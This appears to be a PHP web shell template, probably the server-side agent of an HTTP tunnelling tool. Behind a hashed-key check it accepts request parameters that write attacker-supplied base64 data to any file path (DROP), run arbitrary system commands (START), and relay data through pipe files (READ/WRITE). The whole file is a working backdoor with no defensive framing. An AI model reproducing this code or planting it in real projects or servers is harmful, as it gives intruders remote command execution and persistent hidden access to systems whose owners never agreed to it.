<?php

if (md5($_REQUEST["KEY"]) !== "[HASHED_KEY]"){
  die("");
}


if ($_REQUEST["TODO"]=="TEST")
  {
    echo 'Now: '.time();
    echo "OK";
  }


 else if ($_REQUEST["TODO"]=="DROP")
  {
    file_put_contents($_REQUEST["WHERE"], base64_decode($_REQUEST["WHAT"]));
  }

 else if ($_REQUEST["TODO"]=="START")
  {
    system($_REQUEST["WHERE"]);
  }

 else if ($_REQUEST["TODO"]=="READ")
  {
    if (!file_exists("[PATH_FD]_out")){
      http_response_code(201);
      die("");
    }
    header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
    header("Cache-Control: post-check=0, pre-check=0", false);
    header("Pragma: no-cache");
    $reader = fopen("[PATH_FD]_out", "rb")  or (http_response_code(201) and die ("Fopen Failed"));
    stream_set_blocking($reader, false);
    $dd = fread($reader, 8192);
    $contents = $dd;
    while (strlen($dd) == 8192 ) {
      $dd = fread($reader, 8192);
      $contents .= $dd;
    }
    $d = base64_encode($contents);
    echo $d;
  }

 else if ($_REQUEST["TODO"]=="WRITE")
  {
    if (!file_exists("[PATH_FD]_in")){
      http_response_code(201);
      die("");
    }
    $d = $_REQUEST["DATA"];
    var_dump($_REQUEST);
    $dd = base64_decode($d,true);
    echo $dd;
    $writer = fopen("[PATH_FD]_in", "wb")  or (http_response_code(201) and die ("Fopen Failed"));
    stream_set_blocking($writer, false);
    fwrite($writer, $dd);
  }

?>
